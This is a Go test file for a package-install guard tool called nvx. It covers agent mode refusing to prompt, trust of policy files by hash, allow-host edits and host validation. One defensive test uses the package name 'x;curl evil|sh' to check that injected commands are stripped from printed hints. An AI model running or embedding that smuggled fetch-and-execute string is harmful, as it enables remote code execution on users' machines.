package nvx

import (
	"os"
	"path/filepath"
	"runtime"
	"strings"
	"sync"
	"testing"
	"time"
)

// --agent-mode does not ask even with a terminal on stdin. An agent that drives
// a pseudo-terminal looks like a person there, and the mode says it is not one.
func TestAgentModeDoesNotAskAtATerminal(t *testing.T) {
	t.Setenv("NVX_YES", "")
	t.Setenv("NVX_NONINTERACTIVE", "")
	asked := someoneAtTheConsole(t)
	oldY, oldA := yesFlag, agentModeFlag
	t.Cleanup(func() { yesFlag, agentModeFlag = oldY, oldA })
	yesFlag, agentModeFlag = false, true

	code, out, home := runScenario(t, checkScenario{pkg: "some-pkg", policy: `{"typosquatting":{"enabled":false}}`, age: 2 * time.Hour})
	if *asked {
		t.Error("--agent-mode asked at the terminal")
	}
	if code == 0 {
		t.Fatalf("--agent-mode let the install through:\n%s", out)
	}
	if r := findRecord(readAuditRecords(t, home), "check_refused", "release_age"); r == nil || r["by"] != "agent_mode" {
		t.Errorf("want check_refused by=agent_mode, got %v", readAuditRecords(t, home))
	}

	// The same terminal without the mode still asks a person, and a y approves.
	agentModeFlag = false
	if code, out, _ := runScenario(t, checkScenario{pkg: "some-pkg", policy: `{"typosquatting":{"enabled":false}}`, age: 2 * time.Hour}); code != 0 || !*asked {
		t.Errorf("without --agent-mode the check did not ask a person at the terminal (exit %d):\n%s", code, out)
	}
}

// NVX_AGENT_MODE is --agent-mode, and neither sets -y.
func TestAgentModeFromTheEnvironmentApprovesNothing(t *testing.T) {
	oldY, oldA, oldQ, oldV := yesFlag, agentModeFlag, quietFlag, verboseFlag
	t.Cleanup(func() { yesFlag, agentModeFlag, quietFlag, verboseFlag = oldY, oldA, oldQ, oldV })
	for _, v := range []string{"1", "true", "TRUE"} {
		yesFlag, agentModeFlag, quietFlag = false, false, false
		t.Setenv("NVX_AGENT_MODE", v)
		applyEnvironmentFlags()
		if !agentModeFlag || !quietFlag {
			t.Errorf("NVX_AGENT_MODE=%s did not turn on agent mode", v)
		}
		if yesFlag {
			t.Errorf("NVX_AGENT_MODE=%s set -y", v)
		}
	}
}

// inTrustProject makes a project with a policy file holding body, and runs the
// rest of the test in it. It returns the home and the policy file's path.
func inTrustProject(t *testing.T, body string) (home, policyPath string) {
	t.Helper()
	t.Setenv("NVX_TRUST_YES", "")
	home = tempDir(t)
	project := tempDir(t)
	writePolicyFixture(t, project, "package.json", `{"name":"p"}`)
	if body != "" {
		writePolicyFixture(t, project, ".nvx-policy.json", body)
	}
	inProjectDir(t, project)
	cwd, _ := os.Getwd()
	return home, filepath.Join(cwd, ".nvx-policy.json")
}

// A loosening project policy stops the run with exit 77 and the command that
// trusts it, and `nvx trust` is that command.
func TestNvxTrustIsWhatARefusedPolicyNames(t *testing.T) {
	home, policyPath := inTrustProject(t, `{"isolation":{"network":{"mode":"open"}}}`)
	agentWideningNoteOnce = sync.Once{}

	out := captureStderrHere(t, func() {
		if err := ensureProjectPolicyTrust(home); err != errUntrustedProjectPolicy {
			t.Errorf("an untrusted loosening policy returned %v, want the refusal", err)
		}
	})
	for _, want := range []string{"isolation.network.mode: proxy -> open", "nvx trust .nvx-policy.json --hash ", agentWideningNote} {
		if !strings.Contains(out, want) {
			t.Errorf("the refusal does not say %q:\n%s", want, out)
		}
	}
	if got := refusePolicyBeforeRun(nil, errUntrustedProjectPolicy); got != exitRefused {
		t.Errorf("the refusal exits %d, want %d", got, exitRefused)
	}

	if code := runTrust([]string{".nvx-policy.json"}, home); code != 0 {
		t.Fatalf("nvx trust exited %d", code)
	}
	if err := ensureProjectPolicyTrust(home); err != nil {
		t.Fatalf("after nvx trust the policy is still refused: %v", err)
	}
	if p, err := LoadPolicy(home); err != nil || p.Isolation.Network.Mode != "open" {
		t.Errorf("after nvx trust the policy does not apply: mode %q, %v", p.Isolation.Network.Mode, err)
	}

	// A change to the file is refused again.
	writePolicyFixture(t, filepath.Dir(policyPath), ".nvx-policy.json", `{"isolation":{"enabled":false}}`)
	captureStderrHere(t, func() {
		if err := ensureProjectPolicyTrust(home); err != errUntrustedProjectPolicy {
			t.Errorf("a changed policy file was not refused again: %v", err)
		}
	})
}

// `nvx trust` names only files that apply where it runs, and with no file trusts
// each one that is refused here.
func TestNvxTrustWithoutAFileTrustsWhatIsRefusedHere(t *testing.T) {
	home, _ := inTrustProject(t, `{"typosquatting":{"enabled":false}}`)
	if code := runTrust([]string{filepath.Join(tempDir(t), ".nvx-policy.json")}, home); code == 0 {
		t.Error("nvx trust accepted a file that does not apply here")
	}
	if code := runTrust(nil, home); code != 0 {
		t.Fatalf("nvx trust exited %d", code)
	}
	if err := ensureProjectPolicyTrust(home); err != nil {
		t.Errorf("after nvx trust the policy is still refused: %v", err)
	}
}

// A tool refused a persistent profile is allowed one by `nvx trust --tool`.
func TestNvxTrustToolGrantsTheProfile(t *testing.T) {
	home, _ := inTrustProject(t, "")
	captureStderrHere(t, func() {
		if ensureTrustedToolGrant(home, "wrangler") {
			t.Fatal("a tool got a persistent profile nobody trusted")
		}
	})
	if code := runTrust([]string{"--tool", "wrangler"}, home); code != 0 {
		t.Fatalf("nvx trust --tool exited %d", code)
	}
	if !ensureTrustedToolGrant(home, "wrangler") {
		t.Error("after nvx trust --tool the tool is still refused")
	}
}

// `nvx allow-host` adds the host to this project's policy file, keeps the rest
// of the file where it was, and trusts the result, so the host refused before
// is allowed by the one command the refusal printed.
func TestNvxAllowHostAllowsTheRefusedHost(t *testing.T) {
	home, policyPath := inTrustProject(t, "{\n  \"blocked_packages\": [\"left-pad\"],\n  \"isolation\": {\n    \"level\": \"standard\",\n    \"network\": {\n      \"allow_hosts\": []\n    }\n  }\n}\n")

	if code := runAllowHost([]string{"registry.example.org:443"}, home); code != 0 {
		t.Fatalf("nvx allow-host exited %d", code)
	}
	data, err := os.ReadFile(policyPath)
	if err != nil {
		t.Fatal(err)
	}
	text := string(data)
	if !strings.Contains(text, `"registry.example.org:443"`) {
		t.Fatalf("the host was not written:\n%s", text)
	}
	if b, i := strings.Index(text, "blocked_packages"), strings.Index(text, "isolation"); b < 0 || i < 0 || b > i {
		t.Errorf("the file's keys were reordered:\n%s", text)
	}
	if err := ensureProjectPolicyTrust(home); err != nil {
		t.Fatalf("the edited file is not trusted: %v", err)
	}
	p, err := LoadPolicy(home)
	if err != nil {
		t.Fatal(err)
	}
	if !containsFold(p.Isolation.Network.AllowHosts, "registry.example.org:443") {
		t.Errorf("the host is not in the allowlist in force: %v", p.Isolation.Network.AllowHosts)
	}

	// Again is a no-op, and a host with no port gets 443.
	if code := runAllowHost([]string{"registry.example.org"}, home); code != 0 {
		t.Errorf("allowing the same host again exited %d", code)
	}
	if again, _ := os.ReadFile(policyPath); string(again) != text {
		t.Errorf("allowing the same host again changed the file:\n%s", again)
	}
}

// It does not trust a file that loosens something else nobody has trusted.
// Trusting the file trusts all of it, and the person asked for one host.
func TestNvxAllowHostDoesNotTrustTheRestOfAFile(t *testing.T) {
	home, policyPath := inTrustProject(t, `{"isolation":{"network":{"mode":"open"}}}`)
	before, _ := os.ReadFile(policyPath)
	if code := runAllowHost([]string{"registry.example.org:443"}, home); code == 0 {
		t.Fatal("nvx allow-host trusted a file whose other loosening nobody trusted")
	}
	if after, _ := os.ReadFile(policyPath); string(after) != string(before) {
		t.Errorf("the refused command still changed the file:\n%s", after)
	}
	if err := ensureProjectPolicyTrust(home); err != errUntrustedProjectPolicy {
		t.Errorf("the file was trusted anyway: %v", err)
	}
}

// --global writes ~/.nvx/policy.json, which needs no trust, and creates it.
func TestNvxAllowHostGlobal(t *testing.T) {
	home, _ := inTrustProject(t, "")
	if code := runAllowHost([]string{"registry.example.org:8443", "--global"}, home); code != 0 {
		t.Fatalf("nvx allow-host --global exited %d", code)
	}
	p, err := LoadPolicy(home)
	if err != nil {
		t.Fatal(err)
	}
	if !containsFold(p.Isolation.Network.AllowHosts, "registry.example.org:8443") {
		t.Errorf("the host is not in the allowlist in force: %v", p.Isolation.Network.AllowHosts)
	}
	if len(p.Isolation.Network.DefaultAllow) == 0 {
		t.Error("writing a new global policy dropped the default allowlist")
	}
}

func TestAllowHostEntry(t *testing.T) {
	good := map[string]string{
		"Registry.Example.org": "registry.example.org:443",
		"example.com:8080":     "example.com:8080",
		"example.com:*":        "example.com:*",
		"[::1]:5432":           "::1:5432",
		"10.0.0.1:443":         "10.0.0.1:443",
	}
	for in, want := range good {
		if got, err := allowHostEntry(in); err != nil || got != want {
			t.Errorf("allowHostEntry(%q) = %q, %v; want %q", in, got, err, want)
		}
	}
	for _, bad := range []string{"", "exa mple.com", "example.com:0", "example.com:99999", "example.com:", "a;b:443", "::1"} {
		if got, err := allowHostEntry(bad); err == nil {
			t.Errorf("allowHostEntry(%q) = %q, want an error", bad, got)
		}
	}
}

// The refusal stops the run itself. A command in a project whose policy loosens
// settings and is not trusted exits 77, before anything runs. When nobody could
// answer, the file used to be ignored and the command ran.
func TestARunUnderAnUntrustedPolicyExits77(t *testing.T) {
	home, _ := inTrustProject(t, `{"isolation":{"network":{"mode":"open"}}}`)
	var code int
	out := captureStderrHere(t, func() { code = runShim("node", []string{"-e", "process.exit(0)"}, home) })
	if code != exitRefused {
		t.Fatalf("a run under an untrusted loosening policy exited %d, want %d:\n%s", code, exitRefused, out)
	}
	if !strings.Contains(out, "nvx trust .nvx-policy.json --hash ") || !strings.Contains(out, agentWideningNote) {
		t.Errorf("the refusal does not give the command, or the line for an agent:\n%s", out)
	}
}

// runShim turns the exit code of a run that failed after nvx refused to widen
// the sandbox into 77, and counts only that run's refusals.
func TestRunShimExits77WhenTheCommandFailedAfterARefusal(t *testing.T) {
	inProjectDir(t, tempDir(t))
	orig := runShimTracedFn
	t.Cleanup(func() { runShimTracedFn = orig })

	runShimTracedFn = func(*runTrace, string, []string, string) int {
		recordWideningRefusal("a connection to example.com:443")
		return 3
	}
	var code int
	captureStderrHere(t, func() { code = runShim("node", nil, tempDir(t)) })
	if code != exitRefused {
		t.Fatalf("a run that failed after a refused host exited %d, want %d", code, exitRefused)
	}

	runShimTracedFn = func(*runTrace, string, []string, string) int { return 3 }
	captureStderrHere(t, func() { code = runShim("node", nil, tempDir(t)) })
	if code != 3 {
		t.Errorf("a run with nothing refused exited %d, want its own 3; the last run's refusal was counted", code)
	}
}

// `nvx trust --hash` trusts the file only with the content the refusal showed.
// The file can change between the refusal and the command, and contained code
// that writes the project can change it.
func TestNvxTrustWithAHashTrustsOnlyWhatWasShown(t *testing.T) {
	home, policyPath := inTrustProject(t, `{"typosquatting":{"enabled":false}}`)
	shown, _ := hashPolicyFile(policyPath)
	writePolicyFixture(t, filepath.Dir(policyPath), ".nvx-policy.json", `{"isolation":{"enabled":false}}`)

	if code := runTrust([]string{".nvx-policy.json", "--hash", shown[:trustHashLen]}, home); code == 0 {
		t.Fatal("nvx trust --hash trusted a file that changed after it was shown")
	}
	if err := ensureProjectPolicyTrust(home); err != errUntrustedProjectPolicy {
		t.Fatalf("the changed file was trusted: %v", err)
	}
	now, _ := hashPolicyFile(policyPath)
	if code := runTrust([]string{".nvx-policy.json", "--hash=" + now[:trustHashLen]}, home); code != 0 {
		t.Fatalf("nvx trust --hash did not trust the file it was shown (exit %d)", code)
	}
	if err := ensureProjectPolicyTrust(home); err != nil {
		t.Errorf("after nvx trust --hash the file is still refused: %v", err)
	}
}

// A monorepo's root policy file applies to every workspace package, each a
// project of its own. Trusted once, it counts in all of them. It was recorded
// for the project `nvx trust` ran in, so every command in a package was refused.
func TestTrustAtAMonorepoRootCountsInItsPackages(t *testing.T) {
	t.Setenv("NVX_TRUST_YES", "")
	home := tempDir(t)
	root := tempDir(t)
	writePolicyFixture(t, root, "package.json", `{"name":"mono","workspaces":["packages/*"]}`)
	writePolicyFixture(t, root, ".nvx-policy.json", `{"isolation":{"network":{"allow_hosts":["registry.example.org:443"]}}}`)
	pkg := filepath.Join(root, "packages", "a")
	if err := os.MkdirAll(pkg, 0o700); err != nil {
		t.Fatal(err)
	}
	writePolicyFixture(t, pkg, "package.json", `{"name":"a"}`)

	inProjectDir(t, root)
	if code := runTrust(nil, home); code != 0 {
		t.Fatalf("nvx trust exited %d", code)
	}
	inProjectDir(t, pkg)
	if err := ensureProjectPolicyTrust(home); err != nil {
		t.Fatalf("the root policy, trusted at the root, is refused in a workspace package: %v", err)
	}
	p, err := LoadPolicy(home)
	if err != nil {
		t.Fatal(err)
	}
	if !containsFold(p.Isolation.Network.AllowHosts, "registry.example.org:443") {
		t.Errorf("the trusted root policy does not apply in the package: %v", p.Isolation.Network.AllowHosts)
	}
}

// Trust does not depend on how the current folder is spelled. On Windows a path
// keeps the case it was typed in, and the ledger is keyed by it.
func TestTrustDoesNotDependOnHowTheFolderIsSpelled(t *testing.T) {
	if runtime.GOOS != "windows" {
		t.Skip("letter case is part of a path on this system")
	}
	home, _ := inTrustProject(t, `{"typosquatting":{"enabled":false}}`)
	cwd, _ := os.Getwd()
	respelled := strings.ToLower(cwd)
	if respelled == cwd {
		respelled = strings.ToUpper(cwd)
	}
	if err := os.Chdir(respelled); err != nil {
		t.Fatal(err)
	}
	if got, _ := os.Getwd(); got != respelled {
		t.Skipf("this system reports the folder as %q whatever it was given", got)
	}
	if code := runTrust(nil, home); code != 0 {
		t.Fatalf("nvx trust exited %d", code)
	}
	if err := os.Chdir(cwd); err != nil {
		t.Fatal(err)
	}
	if err := ensureProjectPolicyTrust(home); err != nil {
		t.Errorf("trust recorded from %s does not count from %s: %v", respelled, cwd, err)
	}
}

// Writing a policy file through a symlink writes the file it points at, and
// leaves the link. A dotfiles-managed ~/.nvx/policy.json is a link.
func TestAllowHostWritesThroughASymlinkedPolicy(t *testing.T) {
	home, _ := inTrustProject(t, "")
	real := filepath.Join(tempDir(t), "policy.json")
	writePolicyFixture(t, filepath.Dir(real), "policy.json", `{"blocked_packages":[]}`)
	link := filepath.Join(home, "policy.json")
	if err := os.Symlink(real, link); err != nil {
		t.Skipf("cannot make a symlink here: %v", err)
	}
	if code := runAllowHost([]string{"registry.example.org", "--global"}, home); code != 0 {
		t.Fatalf("nvx allow-host --global exited %d", code)
	}
	if info, err := os.Lstat(link); err != nil || info.Mode()&os.ModeSymlink == 0 {
		t.Errorf("the symlink was replaced by a file")
	}
	data, _ := os.ReadFile(real)
	if !strings.Contains(string(data), "registry.example.org:443") {
		t.Errorf("the file the link points at was not updated:\n%s", data)
	}
}

// A release-age refusal does not print a package name that is not a plain one
// into the commands it offers. The name can come from a lockfile.
func TestReleaseAgeHintKeepsUnsafeNamesOut(t *testing.T) {
	r := releaseAgeRemedy("x;curl evil|sh")
	pin := r.text[:strings.Index(r.text, "To allow")]
	if strings.Contains(pin, ";") || strings.Contains(pin, "|") || !strings.Contains(pin, "<package>@<version>") {
		t.Errorf("an unsafe name reached the commands offered:\n%s", r.text)
	}
}
